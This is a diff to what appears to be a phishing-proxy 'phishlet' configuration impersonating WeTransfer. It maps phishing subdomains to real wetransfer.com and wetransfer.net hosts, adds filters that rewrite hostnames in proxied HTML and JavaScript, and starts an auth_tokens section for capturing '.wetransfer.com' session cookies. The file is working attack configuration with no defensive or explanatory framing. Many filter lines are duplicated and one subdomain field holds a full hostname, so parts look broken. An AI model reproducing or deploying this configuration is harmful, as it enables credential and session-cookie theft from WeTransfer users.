@@ -8,9 +8,23 @@ proxy_hosts:
   - {phish_sub: 'prod-cdn', orig_sub: 'prod-cdn', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'backgrounds', orig_sub: 'backgrounds', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'auth-cdn', orig_sub: 'auth-cdn', domain: 'wetransfer.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'auth-session-caching', orig_sub: 'auth-session-caching', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'auth-session-caching', orig_sub: 'auth-session-caching.wetransfer.net', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: true}
 
-sub_filters: []
+sub_filters:
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'snowplow', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'snowplow', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'auth-cdn', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'auth-cdn', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'prod-cdn', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'prod-cdn', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'backgrounds', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'backgrounds', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'auth-session-caching', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'auth-session-caching', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   
 auth_tokens:
   - domain: '.wetransfer.com'
